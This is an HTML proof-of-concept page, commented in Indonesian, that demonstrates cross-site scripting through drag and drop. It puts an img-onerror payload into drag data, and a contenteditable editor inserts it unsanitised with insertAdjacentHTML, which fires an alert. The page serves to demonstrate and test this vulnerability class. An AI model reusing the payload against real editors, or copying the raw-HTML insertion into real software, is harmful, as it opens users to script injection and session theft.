<!DOCTYPE html>
<html>
<head>
  <title>Drag & Drop XSS PoC</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    #dragme {
      width: 150px; padding: 15px;
      background: #ff5722; color: white;
      cursor: grab; user-select: none;
      text-align: center; border-radius: 8px;
    }
    #editor {
      width: 90%; height: 200px;
      border: 2px dashed #aaa; margin-top: 40px;
      padding: 10px; font-size: 16px;
    }
  </style>
</head>
<body>
  <h2>Drag & Drop XSS PoC</h2>
  <p>ðŸ‘‰ Drag kotak oranye ini lalu drop ke editor di bawah</p>

  <div id="dragme" draggable="true">ðŸ”¥ Drag Me</div>

  <h3>Target WYSIWYG (contenteditable)</h3>
  <div id="editor" contenteditable="true">
    Drop here...
  </div>

  <script>
    const dragme = document.getElementById("dragme");
    const editor = document.getElementById("editor");

    dragme.addEventListener("dragstart", e => {
      // Payload XSS
      const payload = `<img src=x onerror="alert('XSS via Drag&Drop!')">`;
      console.log("Dragging payload:", payload);

      // Inject payload ke DataTransfer
      e.dataTransfer.setData("text/html", payload);
      e.dataTransfer.effectAllowed = "copy";
    });

    // Biar bisa drop
    editor.addEventListener("dragover", e => e.preventDefault());

    editor.addEventListener("drop", e => {
      e.preventDefault();
      // Ambil payload dari drag data
      const data = e.dataTransfer.getData("text/html");
      console.log("Dropped:", data);
      // Insert raw HTML â†’ trigger XSS
      editor.insertAdjacentHTML("beforeend", data);
    });
  </script>
</body>
</html>
